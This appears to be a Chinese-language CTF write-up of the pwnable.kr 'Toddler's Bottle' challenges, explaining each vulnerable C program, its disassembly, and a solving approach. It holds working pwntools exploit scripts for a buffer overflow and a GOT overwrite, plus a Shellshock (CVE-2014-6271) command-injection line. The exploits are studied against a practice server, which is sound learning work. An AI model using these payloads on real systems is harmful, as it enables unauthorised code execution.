---
title: "Pwnable"
date: 2024-11-23T00:00:00+08:00
draft: false
---

# Pwnable

# [Toddler's Bottle]

本文提供了pwnable.kr中题目的简要源码分析与漏洞分析，其连接方式是SSH连接，推荐使用Ubuntu等Linux环境。复制粘贴其题目下的命令，输入密码即可。如果弹出了SSH密钥相关的安全性提示，输入y或yes同意即可。

## 01. fd

> Mommy! what is a file descriptor in Linux?

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
char buf[32];
int main(int argc, char* argv[], char* envp[]){
        if(argc<2){
                printf("pass argv[1] a number\n");
                return 0;
        }
        int fd = atoi( argv[1] ) - 0x1234;
        int len = 0;
        len = read(fd, buf, 32);
        if(!strcmp("LETMEWIN\n", buf)){
                printf("good job :)\n");
                system("/bin/cat flag");
                exit(0);
        }
        printf("learn about Linux file IO\n");
        return 0;

}
```

> ## Linux中的文件描述符（fd）
>
> 我们知道在Linux系统中一切皆可以看成是文件，文件又可分为：普通文件、目录文件、链接文件和设备文件。在操作这些所谓的文件的时候，我们每操作一次就找一次名字，这会耗费大量的时间和效率。所以Linux中规定每一个文件对应一个索引，这样要操作文件的时候，我们直接找到索引就可以对其进行操作了。
>
> 文件描述符（file descriptor）就是内核为了高效管理这些已经被打开的文件所创建的索引，其是一个非负整数（通常是小整数），用于指代被打开的文件，所有执行I/O操作的系统调用都通过文件描述符来实现。同时还规定系统刚刚启动的时候，0是标准输入，1是标准输出，2是标准错误。这意味着如果此时去打开一个新的文件，它的文件描述符会是3，再打开一个文件文件描述符就是4......
>
> Linux内核对所有打开的文件有一个文件描述符表格，里面存储了每个文件描述符作为索引与一个打开文件相对应的关系，简单理解就是下图这样一个数组，文件描述符（索引）就是文件描述符表这个数组的下标，数组的内容就是指向一个个打开的文件的指针。

简单分析代码，当buf变量等于“LETMEWIN“时，可以得到flag，buf变量是read函数的参数，如果想要read函数能够从键盘输入中获取字符，那么这道题就变得很简单了。另外，程序在接收用户输入时使用了启动参数，在启动参数小于2（也就是无启动参数）时，程序会直接退出。

| fd   | 对应的文件 |
| ---- | ---------- |
| 0    | stdin      |
| 1    | stdout     |
| 2    | stderr     |
| ...  | ...        |

0x1234转换为十进制是4660，程序启动参数输入4660，遇到read函数从输入获取内容时输入LETMEWIN，即可得到flag。

```python
from pwn import *
p = make_packer(32)
s = ssh(user='fd', host='pwnable.kr', password='guest', port=2222)
payload = b'4660'
io = s.process(executable='./fd', argv=['col', payload])
io.sendline(b'LETMEWIN')
print(io.recvall())
```

## 02. collision

> Daddy told me about cool MD5 hash collision today.
> I wanna do something like that too!

```c
#include <stdio.h>
#include <string.h>
unsigned long hashcode = 0x21DD09EC;
unsigned long check_password(const char* p){
        int* ip = (int*)p;
        int i;
        int res=0;
        for(i=0; i<5; i++){
                res += ip[i];
        }
        return res;
}

int main(int argc, char* argv[]){
        if(argc<2){
                printf("usage : %s [passcode]\n", argv[0]);
                return 0;
        }
        if(strlen(argv[1]) != 20){
                printf("passcode length should be 20 bytes\n");
                return 0;
        }

        if(hashcode == check_password( argv[1] )){
                system("/bin/cat flag");
                return 0;
        }
        else
                printf("wrong passcode.\n");
        return 0;
}
```

与第一题类似，输入仍然使用启动参数，在check_password函数中，函数接收argv并把其作为int类型读取，读取后将五个数求和，如果和等于hashcode即可得到flag。

思路是，把hashcode除以5保留整数，然后取hashcode除以5的余数，把五个数加起来即可得到

```python
from pwn import *
p = make_packer(32)
s = ssh(user='col', host='pwnable.kr', password='guest', port=2222)
hashcode = 0x21DD09EC
num = hashcode // 5
end = num + hashcode % 5
payload = p(num) * 4 + p(end)
io = s.process(executable='./col', argv=['col', payload])
print(io.recvall())
```

## 03. bof

> Nana told me that buffer overflow is one of the most common software vulnerability. 
> Is that true?

```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
void func(int key){
	char overflowme[32];
	printf("overflow me : ");
	gets(overflowme);	// smash me!
	if(key == 0xcafebabe){
		system("/bin/sh");
	}
	else{
		printf("Nah..\n");
	}
}
int main(int argc, char* argv[]){
	func(0xdeadbeef);
	return 0;
}
```

```
-0000002E                 db ? ; undefined
-0000002D                 db ? ; undefined
-0000002C s (overflowme)  db 32 dup(?)
-0000000C var_C           dd ?
-00000008                 db ? ; undefined
-00000007                 db ? ; undefined
-00000006                 db ? ; undefined
-00000005                 db ? ; undefined
-00000004                 db ? ; undefined
-00000003                 db ? ; undefined
-00000002                 db ? ; undefined
-00000001                 db ? ; undefined
+00000000  s              db 4 dup(?)
+00000004  r              db 4 dup(?)
+00000008 arg_0           dd ?
+0000000C
+0000000C ; end of stack variables
```

使用ida简单看一下，函数参数在32位下于函数调用前会被pop进栈，所以func的参数key会在返回地址之前，overflowme大小0x32，加上ebp和返回地址之后即可覆盖掉key。

```python
from pwn import *
p = make_packer(32)
r = remote('pwnable.kr', 9000)
payload = b'a' * (0x2c + 0x8) + p(0xcafebabe)
r.sendline(payload)
r.sendline(b'cat flag')
print(r.recv())
```

## 04. flag

> Papa brought me a packed present! let's open it.

本题无源代码，是一个简单的逆向题，程序有壳，使用upx解压即可。

```
sudo apt install upx
upx -d ./flag
```

之后使用ida分析，查找跟踪flag变量即可。

![image-20230326232448028](https://typora-1256197903.cos.ap-beijing.myqcloud.com/typora/image-20230326232448028.png)

![image-20230326232503763](https://typora-1256197903.cos.ap-beijing.myqcloud.com/typora/image-20230326232503763.png)

![image-20230326232517866](https://typora-1256197903.cos.ap-beijing.myqcloud.com/typora/image-20230326232517866.png)

## 05. passcode

> Mommy told me to make a passcode based login system.
> My initial C code was compiled without any error!
> Well, there was some compiler warning, but who cares about that?

```c
#include <stdio.h>
#include <stdlib.h>

void login(){
        int passcode1;
        int passcode2;

        printf("enter passcode1 : ");
        scanf("%d", passcode1);
        fflush(stdin);

        // ha! mommy told me that 32bit is vulnerable to bruteforcing :)
        printf("enter passcode2 : ");
        scanf("%d", passcode2);

        printf("checking...\n");
        if(passcode1==338150 && passcode2==13371337){
                printf("Login OK!\n");
                system("/bin/cat flag");
        }
        else{
                printf("Login Failed!\n");
                exit(0);
        }
}

void welcome(){
        char name[100];
        printf("enter you name : ");
        scanf("%100s", name);
        printf("Welcome %s!\n", name);
}

int main(){
        printf("Toddler's Secure Login System 1.0 beta.\n");

        welcome();
        login();

        // something after login...
        printf("Now I can safely trust you that you have credential :)\n");
        return 0;
}

```

这个程序脱离了其本意，在输入passcode1和passcode2时，并未对变量加取地址符号，反而直接把未初始化的变量作为了scanf函数的地址。

现在来看下main函数的反汇编

```
.text:08048665 ; __unwind {
.text:08048665                 push    ebp
.text:08048666                 mov     ebp, esp
.text:08048668                 and     esp, 0FFFFFFF0h
.text:0804866B                 sub     esp, 10h
.text:0804866E                 mov     dword ptr [esp], offset aToddlerSSecure ; "Toddler's Secure Login System 1.0 beta."
.text:08048675                 call    _puts
.text:0804867A                 call    welcome
.text:0804867F                 call    login
.text:08048684                 mov     dword ptr [esp], offset aNowICanSafelyT ; "Now I can safely trust you that you hav"...
.text:0804868B                 call    _puts
.text:08048690                 mov     eax, 0
.text:08048695                 leave
.text:08048696                 retn
.text:08048696 ; } // starts at 8048665
```

在main函数中，对welcome和login的调用是连续调用，导致了两个函数中ebp的值是相同的。

```
.text:08048609 var_70          = byte ptr -70h
.text:08048609 var_C           = dword ptr -0Ch
.text:08048609
.text:08048609 ; __unwind {
.text:08048609                 push    ebp
.text:0804860A                 mov     ebp, esp
.text:0804860C                 sub     esp, 88h
.text:08048612                 mov     eax, large gs:14h
.text:08048618                 mov     [ebp+var_C], eax
.text:0804861B                 xor     eax, eax
.text:0804861D                 mov     eax, offset aEnterYouName ; "enter you name : "
.text:08048622                 mov     [esp], eax      ; format
.text:08048625                 call    _printf
.text:0804862A                 mov     eax, offset a100s ; "%100s"
.text:0804862F                 lea     edx, [ebp+var_70]
.text:08048632                 mov     [esp+4], edx
.text:08048636                 mov     [esp], eax
.text:08048639                 call    ___isoc99_scanf
.text:0804863E                 mov     eax, offset aWelcomeS ; "Welcome %s!\n"
.text:08048643                 lea     edx, [ebp+var_70]
.text:08048646                 mov     [esp+4], edx
.text:0804864A                 mov     [esp], eax      ; format
.text:0804864D                 call    _printf
.text:08048652                 mov     eax, [ebp+var_C]
.text:08048655                 xor     eax, large gs:14h
.text:0804865C                 jz      short locret_8048663
.text:0804865E                 call    ___stack_chk_fail
.text:08048663 ; ---------------------------------------------------------------------------
.text:08048663
.text:08048663 locret_8048663:                         ; CODE XREF: welcome+53↑j
.text:08048663                 leave
.text:08048664                 retn
.text:08048664 ; } // starts at 8048609
```

在首先调用的welcome函数中，name的地址是ebp+var_70，即ebp-70。

```
.text:08048564 var_10          = dword ptr -10h
.text:08048564 var_C           = dword ptr -0Ch
.text:08048564
.text:08048564 ; __unwind {
.text:08048564                 push    ebp
.text:08048565                 mov     ebp, esp
.text:08048567                 sub     esp, 28h
.text:0804856A                 mov     eax, offset format ; "enter passcode1 : "
.text:0804856F                 mov     [esp], eax      ; format
.text:08048572                 call    _printf
.text:08048577                 mov     eax, offset aD  ; "%d"
.text:0804857C                 mov     edx, [ebp+var_10]
.text:0804857F                 mov     [esp+4], edx
.text:08048583                 mov     [esp], eax
.text:08048586                 call    ___isoc99_scanf
.text:0804858B                 mov     eax, ds:stdin@@GLIBC_2_0
.text:08048590                 mov     [esp], eax      ; stream
.text:08048593                 call    _fflush
.text:08048598                 mov     eax, offset aEnterPasscode2 ; "enter passcode2 : "
.text:0804859D                 mov     [esp], eax      ; format
.text:080485A0                 call    _printf
.text:080485A5                 mov     eax, offset aD  ; "%d"
.text:080485AA                 mov     edx, [ebp+var_C]
.text:080485AD                 mov     [esp+4], edx
.text:080485B1                 mov     [esp], eax
.text:080485B4                 call    ___isoc99_scanf
.text:080485B9                 mov     dword ptr [esp], offset s ; "checking..."
.text:080485C0                 call    _puts
.text:080485C5                 cmp     [ebp+var_10], 528E6h
.text:080485CC                 jnz     short loc_80485F1
.text:080485CE                 cmp     [ebp+var_C], 0CC07C9h
.text:080485D5                 jnz     short loc_80485F1
.text:080485D7                 mov     dword ptr [esp], offset aLoginOk ; "Login OK!"
.text:080485DE                 call    _puts
.text:080485E3                 mov     dword ptr [esp], offset command ; "/bin/cat flag"
.text:080485EA                 call    _system
.text:080485EF                 leave
.text:080485F0                 retn
.text:080485F1 ; ---------------------------------------------------------------------------
.text:080485F1
.text:080485F1 loc_80485F1:                            ; CODE XREF: login+68↑j
.text:080485F1                                         ; login+71↑j
.text:080485F1                 mov     dword ptr [esp], offset aLoginFailed ; "Login Failed!"
.text:080485F8                 call    _puts
.text:080485FD                 mov     dword ptr [esp], 0 ; status
.text:08048604                 call    _exit
.text:08048604 ; } // starts at 8048564
```

在login函数中，passcode1所对比的值的地址是ebp+var_10，passcode2所对比的值是ebp+var_c的值。

大致栈结构如下

![image-20230327032144013](https://typora-1256197903.cos.ap-beijing.myqcloud.com/typora/image-20230327032144013.png)

所以我们只需要精心构造name中的值，即可修改passcode1的值，passcode1相对输入点（name）的偏移为0x60，虽然我们无法修改passcode2的值，但是此时got表是可写的，可以利用scanf把程序即将调用的函数的got表覆写成我们想要的地址，这样就能跳到我们想要的函数了，也就是在运行第一个scanf之后，我们可以通过修改fflush、printf等函数的got表来跳转到login函数中的system函数

```
.text:080485E3                 mov     dword ptr [esp], offset command ; "/bin/cat flag"
.text:080485EA                 call    _system
```

另外要把system的地址转换为十进制，因为输入的scanf使用了%d参数，所以payload为

```python
from pwn import *
p = make_packer(32)
s = ssh(user='passcode', host='pwnable.kr', password='guest', port=2222)
io = s.process(executable='./passcode')
printf_got = 0x0804a000
system_in_login_addr = b'134514147'
payload = b'a' * 96 + p(printf_got) + b'\n' + system_in_login_addr
io.sendline(payload)
io.interactive()
```

## 06. random

> Daddy, teach me how to use random value in programming!

```c
#include <stdio.h>

int main(){
        unsigned int random;
        random = rand();        // random value!

        unsigned int key=0;
        scanf("%d", &key);

        if( (key ^ random) == 0xdeadbeef ){
                printf("Good!\n");
                system("/bin/cat flag");
                return 0;
        }

        printf("Wrong, maybe you should try 2^32 cases.\n");
        return 0;
}

```

> 系统在调用rand()之前都会自动调用srand(),如果在srand()里给参数seed指定了一个值，那么 rand()就会将seed的值作为产生伪随机数的初始值；**而如果用户在rand()前没有调用过srand()，那么系统默认将1作为伪随机数的初始值**，如果初始值是此时的1或是其他定值，那么每次rand()产生的随机数序列都是一样的，这也就是所谓的“伪随机数”。

如果我们能知道随机数的值，就可以根据deadbeef求出所需key值了。

完全根据题目中的条件编译一个相似的程序

```c
#include<stdio.h>
int main()
{
	unsigned int random;
	random = rand();
	printf("%u", random ^ 0xdeadbeef);
	return 0;
}
```

得到3039230856，输入即可。

## 07. input

> Mom? how can I pass my input to a computer program?

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>

int main(int argc, char* argv[], char* envp[]){
	printf("Welcome to pwnable.kr\n");
	printf("Let's see if you know how to give input to program\n");
	printf("Just give me correct inputs then you will get the flag :)\n");

	// argv
	if(argc != 100) return 0;
	if(strcmp(argv['A'],"\x00")) return 0;
	if(strcmp(argv['B'],"\x20\x0a\x0d")) return 0;
	printf("Stage 1 clear!\n");	

	// stdio
	char buf[4];
	read(0, buf, 4);
	if(memcmp(buf, "\x00\x0a\x00\xff", 4)) return 0;
	read(2, buf, 4);
        if(memcmp(buf, "\x00\x0a\x02\xff", 4)) return 0;
	printf("Stage 2 clear!\n");
	
	// env
	if(strcmp("\xca\xfe\xba\xbe", getenv("\xde\xad\xbe\xef"))) return 0;
	printf("Stage 3 clear!\n");

	// file
	FILE* fp = fopen("\x0a", "r");
	if(!fp) return 0;
	if( fread(buf, 4, 1, fp)!=1 ) return 0;
	if( memcmp(buf, "\x00\x00\x00\x00", 4) ) return 0;
	fclose(fp);
	printf("Stage 4 clear!\n");	

	// network
	int sd, cd;
	struct sockaddr_in saddr, caddr;
	sd = socket(AF_INET, SOCK_STREAM, 0);
	if(sd == -1){
		printf("socket error, tell admin\n");
		return 0;
	}
	saddr.sin_family = AF_INET;
	saddr.sin_addr.s_addr = INADDR_ANY;
	saddr.sin_port = htons( atoi(argv['C']) );
	if(bind(sd, (struct sockaddr*)&saddr, sizeof(saddr)) < 0){
		printf("bind error, use another port\n");
    		return 1;
	}
	listen(sd, 1);
	int c = sizeof(struct sockaddr_in);
	cd = accept(sd, (struct sockaddr *)&caddr, (socklen_t*)&c);
	if(cd < 0){
		printf("accept error, tell admin\n");
		return 0;
	}
	if( recv(cd, buf, 4, 0) != 4 ) return 0;
	if(memcmp(buf, "\xde\xad\xbe\xef", 4)) return 0;
	printf("Stage 5 clear!\n");

	// here's your flag
	system("/bin/cat flag");	
	return 0;
}
```

这道题不太算Pwn题，有点根据服务端写客户端的意思。只需要根据函数中的stage构造需求即可。但是有些条件只能在靶机上完成，所以没有使用pwntools，建议在本地写完之后上传到靶机即可。

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <arpa/inet.h>

int main(){
   int i;

  /* Stage 1: argv */
  char *args[101] = {};

  for (i=0; i<101; i++) {
      args[i] = "A"; // fill up 100 arguments with a filler char
  }

  args['A'] = "\x00";
  args['B'] = "\x20\x0a\x0d";
  args['C'] = "5001";

  args[100] = NULL;

  /* Stage 3: env */
  setenv("\xde\xad\xbe\xef", "\xca\xfe\xba\xbe", 1);
  extern char** environ;

  /* Stage 4: file */
  FILE* fp = fopen("\x0a", "w");
  //size_t fwrite(const void *ptr, size_t size, size_t nmemb, FILE *stream)
  fwrite("\x00\x00\x00\x00", 4, 1, fp);
  fclose(fp);

  /* Stage 2:  stdio */
  pid_t childpid;
  int pipe_stdin[2];
  int pipe_stderr[2];

  // call pipe on both of them
  if (pipe(pipe_stdin) < 0  || pipe(pipe_stderr) < 0) {
    perror("oh no\n");
    exit(1);
  };

  // fork the process
  if((childpid = fork()) < 0)
  {
    perror("fork, oop");
    exit(1);
  }

  // child process can close input side of pipe and write expected values
  if(childpid == 0)
  {
    /* Child process closes up input side of pipe */
    close(pipe_stdin[0]);
    close(pipe_stderr[0]);

    write(pipe_stdin[1], "\x00\x0a\x00\xff", 4);
    write(pipe_stderr[1], "\x00\x0a\x02\xff", 4);

    /* Stage 5:  network */
    sleep(5);
    int sd, cd;
    struct sockaddr_in saddr;
    sd = socket(AF_INET, SOCK_STREAM, 0);

    if(sd == -1){
      printf("socket error, tell admin\n");
      return 0;
    }
    saddr.sin_family = AF_INET;
    saddr.sin_addr.s_addr = inet_addr("127.0.0.1");
    saddr.sin_port = htons(atoi(args['C']));

    if(connect(sd, (struct sockaddr *)&saddr, sizeof(saddr))<0)
    {
      printf("\n Error : Connect Failed \n");
      return 1;
    }

    write(sd, "\xde\xad\xbe\xef", 4);
    close(sd);

    return 0;
  }
  else
  {
  /* parent process can close up output side of pipe, connect it to stdin and stderr,
     and then close the input side and call/home/input2/input */
    close(pipe_stdin[1]);
    close(pipe_stderr[1]);

    dup2(pipe_stdin[0],0);
    dup2(pipe_stderr[0],2);

    close(pipe_stdin[0]);
    close(pipe_stderr[0]);
    execve("/home/input2/input", args, environ);
  }
}
```

```bash
scp -P 2222 ./1.c input2@pwnable.kr:/tmp/freeez
gcc ./1.c -o input-flag
ln -sf /home/input2/flag flag
./input-flag
```

## 08. leg

> Daddy told me I should study arm.
> But I prefer to study my leg!

```c
#include <stdio.h>
#include <fcntl.h>
int key1(){
	asm("mov r3, pc\n");
}
int key2(){
	asm(
	"push	{r6}\n"
	"add	r6, pc, $1\n"
	"bx	r6\n"
	".code   16\n"
	"mov	r3, pc\n"
	"add	r3, $0x4\n"
	"push	{r3}\n"
	"pop	{pc}\n"
	".code	32\n"
	"pop	{r6}\n"
	);
}
int key3(){
	asm("mov r3, lr\n");
}
int main(){
	int key=0;
	printf("Daddy has very strong arm! : ");
	scanf("%d", &key);
	if( (key1()+key2()+key3()) == key ){
		printf("Congratz!\n");
		int fd = open("flag", O_RDONLY);
		char buf[100];
		int r = read(fd, buf, 100);
		write(0, buf, r);
	}
	else{
		printf("I have strong leg :P\n");
	}
	return 0;
}
```

```
(gdb) disass main
Dump of assembler code for function main:
   0x00008d3c <+0>:	push	{r4, r11, lr}
   0x00008d40 <+4>:	add	r11, sp, #8
   0x00008d44 <+8>:	sub	sp, sp, #12
   0x00008d48 <+12>:	mov	r3, #0
   0x00008d4c <+16>:	str	r3, [r11, #-16]
   0x00008d50 <+20>:	ldr	r0, [pc, #104]	; 0x8dc0 <main+132>
   0x00008d54 <+24>:	bl	0xfb6c <printf>
   0x00008d58 <+28>:	sub	r3, r11, #16
   0x00008d5c <+32>:	ldr	r0, [pc, #96]	; 0x8dc4 <main+136>
   0x00008d60 <+36>:	mov	r1, r3
   0x00008d64 <+40>:	bl	0xfbd8 <__isoc99_scanf>
   0x00008d68 <+44>:	bl	0x8cd4 <key1>
   0x00008d6c <+48>:	mov	r4, r0
   0x00008d70 <+52>:	bl	0x8cf0 <key2>
   0x00008d74 <+56>:	mov	r3, r0
   0x00008d78 <+60>:	add	r4, r4, r3
   0x00008d7c <+64>:	bl	0x8d20 <key3>
   0x00008d80 <+68>:	mov	r3, r0
   0x00008d84 <+72>:	add	r2, r4, r3
   0x00008d88 <+76>:	ldr	r3, [r11, #-16]
   0x00008d8c <+80>:	cmp	r2, r3
   0x00008d90 <+84>:	bne	0x8da8 <main+108>
   0x00008d94 <+88>:	ldr	r0, [pc, #44]	; 0x8dc8 <main+140>
   0x00008d98 <+92>:	bl	0x1050c <puts>
   0x00008d9c <+96>:	ldr	r0, [pc, #40]	; 0x8dcc <main+144>
   0x00008da0 <+100>:	bl	0xf89c <system>
   0x00008da4 <+104>:	b	0x8db0 <main+116>
   0x00008da8 <+108>:	ldr	r0, [pc, #32]	; 0x8dd0 <main+148>
   0x00008dac <+112>:	bl	0x1050c <puts>
   0x00008db0 <+116>:	mov	r3, #0
   0x00008db4 <+120>:	mov	r0, r3
   0x00008db8 <+124>:	sub	sp, r11, #8
   0x00008dbc <+128>:	pop	{r4, r11, pc}
   0x00008dc0 <+132>:	andeq	r10, r6, r12, lsl #9
   0x00008dc4 <+136>:	andeq	r10, r6, r12, lsr #9
   0x00008dc8 <+140>:			; <UNDEFINED> instruction: 0x0006a4b0
   0x00008dcc <+144>:			; <UNDEFINED> instruction: 0x0006a4bc
   0x00008dd0 <+148>:	andeq	r10, r6, r4, asr #9
End of assembler dump.
```
```
(gdb) disass key1
Dump of assembler code for function key1:
   0x00008cd4 <+0>:	push	{r11}		; (str r11, [sp, #-4]!)
   0x00008cd8 <+4>:	add	r11, sp, #0
   0x00008cdc <+8>:	mov	r3, pc
   0x00008ce0 <+12>:	mov	r0, r3
   0x00008ce4 <+16>:	sub	sp, r11, #0
   0x00008ce8 <+20>:	pop	{r11}		; (ldr r11, [sp], #4)
   0x00008cec <+24>:	bx	lr
End of assembler dump.
```

返回值为r0,r0保存的是0x00008cdc处时的pc值，由于流水线处理，pc为进接的第二条指令的地址，pc=0x00008ce4，key1()=0x00008ce4

```
(gdb) disass key2
Dump of assembler code for function key2:
   0x00008cf0 <+0>:	push	{r11}		; (str r11, [sp, #-4]!)
   0x00008cf4 <+4>:	add	r11, sp, #0
   0x00008cf8 <+8>:	push	{r6}		; (str r6, [sp, #-4]!)
   0x00008cfc <+12>:	add	r6, pc, #1
   0x00008d00 <+16>:	bx	r6
   0x00008d04 <+20>:	mov	r3, pc
   0x00008d06 <+22>:	adds	r3, #4
   0x00008d08 <+24>:	push	{r3}
   0x00008d0a <+26>:	pop	{pc}
   0x00008d0c <+28>:	pop	{r6}		; (ldr r6, [sp], #4)
   0x00008d10 <+32>:	mov	r0, r3
   0x00008d14 <+36>:	sub	sp, r11, #0
   0x00008d18 <+40>:	pop	{r11}		; (ldr r11, [sp], #4)
   0x00008d1c <+44>:	bx	lr
End of assembler dump.
```

同key1,r0保存的是r3+#4，而r3是0X00008d04时的pc值，pc=0x00008d08,所以key2=0x00008d08+4=0x00008d0c

```
(gdb) disass key3
Dump of assembler code for function key3:
   0x00008d20 <+0>:	push	{r11}		; (str r11, [sp, #-4]!)
   0x00008d24 <+4>:	add	r11, sp, #0
   0x00008d28 <+8>:	mov	r3, lr
   0x00008d2c <+12>:	mov	r0, r3
   0x00008d30 <+16>:	sub	sp, r11, #0
   0x00008d34 <+20>:	pop	{r11}		; (ldr r11, [sp], #4)
   0x00008d38 <+24>:	bx	lr
End of assembler dump.
```
r0的值是lr的值，而lr是子函数返回位置的地址，在main函数中可以看到为0x00008d80
所以key = 0x00008d80+0x00008d0c+0x00008ce4=108400

## 09. mistake

> We all make mistakes, let's move on.
> (don't take this too seriously, no fancy hacking skill is required at all)
>
> This task is based on real event
> Thanks to dhmonkey
>
> hint : operator priority

```c
#include <stdio.h>
#include <fcntl.h>

#define PW_LEN 10
#define XORKEY 1

void xor(char* s, int len){
        int i;
        for(i=0; i<len; i++){
                s[i] ^= XORKEY;
        }
}

int main(int argc, char* argv[]){

        int fd;
        if(fd=open("/home/mistake/password",O_RDONLY,0400) < 0){
                printf("can't open password %d\n", fd);
                return 0;
        }

        printf("do not bruteforce...\n");
        sleep(time(0)%20);

        char pw_buf[PW_LEN+1];
        int len;
        if(!(len=read(fd,pw_buf,PW_LEN) > 0)){
                printf("read error\n");
                close(fd);
                return 0;
        }

        char pw_buf2[PW_LEN+1];
        printf("input password : ");
        scanf("%10s", pw_buf2);

        // xor your input
        xor(pw_buf2, 10);

        if(!strncmp(pw_buf, pw_buf2, PW_LEN)){
                printf("Password OK\n");
                system("/bin/cat flag\n");
        }
        else{
                printf("Wrong Password\n");
        }

        close(fd);
        return 0;
}
```

在` if(fd=open("/home/mistake/password",O_RDONLY,0400) < 0)`中，大小判断的优先级大于赋值的优先级，先比较后赋值，也就是说这行内容实际等价于` fd=0`，在后面的read函数不会从password文件读取内容，反而会从用户的输入中读取。所以首先输入十个0，再输入十个1，即可得到flag

## 10. shellshock

> Mommy, there was a shocking news about bash.
> I bet you already know, but lets just make it sure :)

```c
#include <stdio.h>
int main(){
        setresuid(getegid(), getegid(), getegid());
        setresgid(getegid(), getegid(), getegid());
        system("/home/shellshock/bash -c 'echo shock_me'");
        return 0;
}
```

本题来自漏洞CVE-2014-6271

https://www.antiy.com/response/CVE-2014-6271.html

> **六、**   **漏洞原理**
>
> 目前的bash使用的环境变量是通过函数名称来调用的，导致漏洞出问题是以“(){”开头定义的环境变量在命令ENV中解析成函数后，Bash执行并未退出，而是继续解析并执行shell命令。核心的原因在于在输入的过滤中没有严格限制边界，没有做合法化的参数判断。
>
> 在补丁中主要进行了参数的合法性过滤，补丁程序在/builtins/evalstring.c的parse_and_execute函数中进行了输入的command进行了合法性的边界检测，将代码注入的可能性排除。在排除中主要用到了flags的两次判断和command的一次类型匹配，为了能够flags判断准确，在补丁中预先定义了SEVAL_FUNCDEF、SEVAL_ONECMD两个标识作为判断依据。
>
> 此漏洞进行的补丁更新有三处，主要进行输入的command进行过滤作用。
>
> /builtins/common.h
>
>  #define SEVAL_FUNCDEF 0x080     /* only allow function definitions */ #define SEVAL_ONECMD 0x100     /* only allow a single command */
>
> /builtins/evalstring.c
>
> ​      if ((flags & SEVAL_FUNCDEF) && command->type != cm_function_def)     {      internal_warning ("%s: ignoring function definition attempt", from_file);      should_jump_to_top_level = 0;      last_result = last_command_exit_value = EX_BADUSAGE;      break;     }
>
> /builtins/evalstring.c
>
>    if (flags & SEVAL_ONECMD)     break;
>
> 从阐述的漏洞原理可知，漏洞的根本原因存在于bash的ENV命令实现上，因此漏洞本身是不能够直接导致远程代码执行的。如果达到远程代码执行的目的，必须要借助第三方服务程序作为媒介才能够实现，第三方服务程序也必须要满足众多条件才可以充当此媒介的角色。例如，第三方服务程序apache2便可充当此媒介，其CGI组件满足远程访问并调用bash的ENV命令进行访问数据解析功能。具体如何实现，见下面的原理图：CVE-2014-6271漏洞实现远程代码执行原理图。
>
> ······
>
> 1. **本地验证方法：**
>
> **在shell中执行下面命令：**
>
> **env x='() { :;}; echo Vulnerable CVE-2014-6271 ' bash -c "echo test"**
>
> **执行命令后，如果显示Vulnerable CVE-2014-6271，证系统存在漏洞，可改变echo Vulnerable CVE-2014-6271为任意命令进行执行。**

所以`env x='() { :;}; echo /bin/cat flag ' bash -c "echo test"`即可

## 11. coin1

> Mommy, I wanna play a game!
> (if your network response time is too slow, try nc 0 9007 inside pwnable.kr server)

```
root@Lenovo:~/pwnable# nc pwnable.kr 9007

        ---------------------------------------------------
        -              Shall we play a game?              -
        ---------------------------------------------------

        You have given some gold coins in your hand
        however, there is one counterfeit coin among them
        counterfeit coin looks exactly same as real coin
        however, its weight is different from real one
        real coin weighs 10, counterfeit coin weighes 9
        help me to find the counterfeit coin with a scale
        if you find 100 counterfeit coins, you will get reward :)
        FYI, you have 60 seconds.

        - How to play - 
        1. you get a number of coins (N) and number of chances (C)
        2. then you specify a set of index numbers of coins to be weighed
        3. you get the weight information
        4. 2~3 repeats C time, then you give the answer

        - Example -
        [Server] N=4 C=2        # find counterfeit among 4 coins with 2 trial
        [Client] 0 1            # weigh first and second coin
        [Server] 20                     # scale result : 20
        [Client] 3                      # weigh fourth coin
        [Server] 10                     # scale result : 10
        [Client] 2                      # counterfeit coin is third!
        [Server] Correct!

        - Ready? stting in 3 sec... -

N=895 C=10
```

根据题意，真金币的重量是10，假金币的重量是9，二分法查找假硬币的index即可
